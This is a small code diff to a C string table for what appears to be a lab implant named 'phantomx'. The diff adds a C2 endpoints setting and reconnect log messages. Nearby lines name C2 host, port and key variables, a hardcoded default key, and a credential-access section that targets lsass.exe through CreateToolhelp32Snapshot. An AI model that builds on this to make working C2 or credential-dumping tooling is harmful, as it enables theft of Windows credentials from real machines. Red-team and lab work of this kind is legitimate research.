@@ -52,6 +52,7 @@
     X(ENV_C2_HOST, "PX_C2_HOST")                                            \
     X(ENV_C2_PORT, "PX_C2_PORT")                                            \
     X(ENV_C2_KEY, "PX_C2_KEY")                                              \
+    X(ENV_C2_ENDPOINTS, "PX_C2_ENDPOINTS")                                  \
     X(DEFAULT_KEY, "phantomx-lab-key-0123456789abcdef")                     \
     X(ENV_TRACE, "PX_TRACE")                                                  \
     /* --- report text ------------------------------------------------- */  \
@@ -107,6 +108,8 @@
     X(TXT_LOG_FRAME_LEN, "[px] bad frame length %lu\n")                   \
     X(TXT_LOG_FINISHED, "[px] finished\n")                                 \
     X(TXT_LOG_ENC_STATE, "[px] channel encryption %s\n")                  \
+    X(TXT_LOG_BACKOFF, "[px] reconnecting in %lu seconds\n")               \
+    X(TXT_LOG_RECONNECT, "[px] session ended, reconnecting\n")              \
     /* --- credential access -------------------------------------------- */  \
     X(LSASS_EXE, "lsass.exe")                                               \
     X(TOOLHELP32, "CreateToolhelp32Snapshot")                               \
